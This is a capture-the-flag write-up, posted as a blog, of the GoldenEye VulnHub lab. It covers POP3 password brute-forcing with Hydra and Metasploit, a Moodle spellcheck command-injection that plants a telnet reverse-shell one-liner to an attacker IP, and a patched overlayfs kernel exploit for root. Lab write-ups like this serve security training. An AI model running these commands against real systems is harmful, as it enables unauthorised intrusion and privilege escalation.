@@ -1,0 +1,370 @@
+---
+layout: post
+title: "GoldenEye 007"
+date: 2019-04-02 21:57:39 +0300
+comments: true
+categories: [penetration testing, writeups]
+keywords: goldeneye, pentest lab, vulnhub, ctf, boot2root, moodle
+description: GoldenEye writeup
+---
+
+
+Today's VM is inspired by a James Bond movie:
+
+> I recently got done creating an OSCP type vulnerable machine that's themed after the great James Bond film (and even better n64 game) GoldenEye.
+> The goal is to get root and capture the secret GoldenEye codes - flag.txt.
+
+> I'd rate it as Intermediate, it has a good variety of techniques needed to get root - no exploit development/buffer overflows. After completing
+> the OSCP I think this would be a great one to practice on, plus there's a hint of CTF flavor.
+
+<!-- more -->
+
+```
+PORT      STATE SERVICE     VERSION
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: GoldenEye Primary Admin Server
+55006/tcp open  ssl/unknown
+|_ssl-date: TLS randomness does not represent time
+55007/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: SASL(PLAIN) USER AUTH-RESP-CODE CAPA STLS UIDL PIPELINING RESP-CODES TOP
+|_ssl-date: TLS randomness does not represent time
+```
+
+Navigating to the web server takes you to this screen:
+
+{% img center /images/pentest/goldeneye/web.png 'goldeneye web' 'goldeneye web' %}
+
+In the source code of the page there's a linked *terminal.js* file. Viewing that reveals some interesting comments:
+
+``` html
+//
+//Boris, make sure you update your default password.
+//My sources say MI6 maybe planning to infiltrate.
+//Be on the lookout for any suspicious network traffic....
+//
+//I encoded you p@ssword below...
+//
+//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
+//
+//BTW Natalya says she can break your codes
+//
+```
+
+So we have a HTML encoded password which decodes to <code>InvincibleHack3r</code>. Now we can go to */sev-home* and log in as boris with this password.
+
+{% img center /images/pentest/goldeneye/goldeneye.png 'goldeneye login' 'goldeneye login' %}
+
+We can now make use of that POP3 service on port 55007. Boris' credentials didn't work though. I used Nikto to further look at the web server and got an interesting hit:
+
+```
++ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+```
+
+Going to that page wasn't immediately useful though, but maybe some of the information could be used further:
+
+{% img center /images/pentest/goldeneye/splashadmin.png 'splashadmin' 'splashadmin' %}
+
+With nothing else to go from, I attempted to bruteforce the mail login credentials for boris with the Metasploit *scanner/pop3/pop3_login* module and the *fasttrack.txt* wordlist:
+
+```
+[+] 192.168.159.130:55007 - 192.168.159.130:55007 - Success: 'boris:secret1!' '+OK Logged in.  '
+```
+
+So now we have credentials for Boris' mail and I was able to read his mails:
+
+```
+nc 192.168.159.130 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER boris
++OK
+PASS secret1!
++OK Logged in.
+LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+.
+RETR 1
++OK 544 octets
+Return-Path: <root@127.0.0.1.goldeneye>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id D9E47454B1
+	for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+Message-Id: <20180425022326.D9E47454B1@ubuntu>
+Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
+From: root@127.0.0.1.goldeneye
+
+Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
+.
+RETR 2
++OK 373 octets
+Return-Path: <natalya@ubuntu>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id C3F2B454B1
+	for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+Message-Id: <20180425024249.C3F2B454B1@ubuntu>
+Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
+From: natalya@ubuntu
+
+Boris, I can break your codes!
+.
+RETR 3
++OK 921 octets
+Return-Path: <alec@janus.boss>
+X-Original-To: boris
+Delivered-To: boris@ubuntu
+Received: from janus (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id 4B9F4454B1
+	for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+Message-Id: <20180425025235.4B9F4454B1@ubuntu>
+Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
+From: alec@janus.boss
+
+Boris,
+
+Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!
+
+Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....
+
+PS - Keep security tight or we will be compromised.
+```
+
+We now know to look for access codes once we get a shell on the target. We also learned there's another username on the ubuntu domain: natalya. So I kicked off the bruteforce for her account as well, this time with Hydra, because I wasn't happy with the speed of the Metasploit module.
+
+```
+hydra -l natalya -P /usr/share/wordlists/fasttrack.txt 192.168.159.130 -s 55007 pop3 -f
+[55007][pop3] host: 192.168.159.130   login: natalya   password: bird
+```
+
+Got lucky with natalya as well. Now back to reading emails:
+
+```
+nc 192.168.159.130 55007
++OK GoldenEye POP3 Electronic-Mail System
+USER natalya
++OK
+PASS bird
++OK Logged in.
+LIST
++OK 2 messages:
+1 631
+2 1048
+.
+RETR 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+```
+
+Now we've learned some interesting things..it seems Boris is a double agent! We now have a new set of credentials: <code>xenia:RCP90rulez!</code> and the internal domain for which we have to add an entry in our hosts file. With that done, going to the URL took me to a training portal:
+
+{% img center /images/pentest/goldeneye/moodle.png 'moodle' 'moodle' %}
+
+We can log in as Xenia and find a message on the platform:
+
+```
+Tuesday, 24 April 2018
+09:24 PM: Greetings Xenia,
+
+As a new Contractor to our GoldenEye training I welcome you. Once your account has been complete, more courses will appear on your dashboard. If you have any questions message me via email, not here.
+
+My email username is...
+
+doak
+
+Thank you,
+
+Cheers,
+
+Dr. Doak "The Doctor"
+```
+
+We have a new mail username and by now we know what's coming..
+
+```
+[55007][pop3] host: 192.168.159.130   login: doak   password: goat
+```
+
+There's only one mail, but it contains portal credentials:
+
+```
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+```
+
+Look around until you find a secret file inside My private files:
+
+{% img center /images/pentest/goldeneye/secret.png 'secret' 'secret' %}
+
+The contents are:
+
+```
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt.
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+```
+
+The image most likely has hidden data within:
+
+{% img center /images/pentest/goldeneye/for-007.jpg 'message for 007' 'message for 007' %}
+
+Running strings on the image reveals a base64 string: *eFdpbnRlcjE5OTV4IQ==*, which is decoded to <code>xWinter1995x!</code>. Now we can log in as admin to the platform. After some more recon, it seems that we can achieve RCE with a Metasploit exploit for Moodle:
+
+> Moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point 
+> to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands 
+> in the context of the web application upon spellchecking requests. This module also allows an attacker to leverage another privilege escalation
+> vuln. Using the referenced XSS vuln, an unprivileged authenticated user can steal an admin sesskey and use this to escalate privileges to that 
+> of an admin, allowing the module to pop a shell as a previously unprivileged authenticated user. This module was tested against Moodle version 
+> 2.5.2 and 2.2.3.
+
+The admin account we hijacked has the necessary privileges, so we can use this exploit.
+
+```
+Module options (exploit/multi/http/moodle_cmd_exec):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   xWinter1995x!          yes       Password to authenticate with
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     severnaya-station.com  yes       The target address range or CIDR identifier
+   RPORT      80                     yes       The target port (TCP)
+   SESSKEY                           no        The session key of the user to impersonate
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /gnocertdir            yes       The URI of the Moodle installation
+   USERNAME   admin                  yes       Username to authenticate with
+   VHOST                             no        HTTP server virtual host
+```
+
+It seemed straightforward, but the exploit failed to run for me. I looked over the source code and saw that the spellcheck engine that is set by the exploit is PSpellShell. By default on the site, the TinyMCE HTML editor spell engine selected was Google Spell. So I manually changed this and ran the exploit again, but it still didn't work. So I did it manually. Recall this part:
+
+> By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application
+> upon spellchecking requests
+
+Under Server -> System paths, I edited the **Path to aspell** field with this reverse shell one-liner (had to cycle through a couple before finding one that worked): <code>sh -c '(mknod /tmp/backpipe p 2> /dev/null && /bin/bash 0</tmp/backpipe | telnet 192.168.159.129 8080 1>/tmp/backpipe &)'</code>
+
+
+Now if you go to Blogs and add a new entry, you can invoke the spellchecker by clicking on the spellcheck button:
+
+{% img center /images/pentest/goldeneye/spellcheck.png 'spellcheck' 'spellcheck' %}
+
+And you should receive a shell on your listener. I upgraded it to a proper one:
+
+```
+nc -vnlp 8080
+listening on [any] 8080 ...
+connect to [192.168.159.129] from (UNKNOWN) [192.168.159.130] 54586
+whoami
+www-data
+python -c 'import pty;pty.spawn("/bin/bash")'
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$
+```
+
+The kernel version is really old:
+
+```
+uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+I used the [overlayfs](https://www.exploit-db.com/exploits/37292) exploit. There was no GCC on the box, but remember that webpage that mentioned clang. I compiled the exploit with clang: <code>clang 37292.c</code>. There were 5 warnings generated, but an executable a.out was generated. However, it didn't give me a root shell. When I looked through the exploit source code, I found a gcc reference:
+
+``` c
+lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
+```
+
+Replacing gcc with cc (the default compiler) in this line and recompiling the code worked and I got root. Then I found the secret codes inside a hidden file in /root:
+
+```
+# cat /root/.flag.txt
+cat /root/.flag.txt
+Alec told me to place the codes here:
+
+568628e0d993b1973adc718237da6e93
+
+If you captured this make sure to go here.....
+/006-final/xvf7-flag/
+```
+
+Visit that path on the web server and mission accomplished!
+
+{% img center /images/pentest/goldeneye/flag.png 'flag' 'flag' %}
+
+``` 
+ ____________________________________
+/ Excellent time to become a missing \
+\ person.                            /
+ ------------------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+```
+
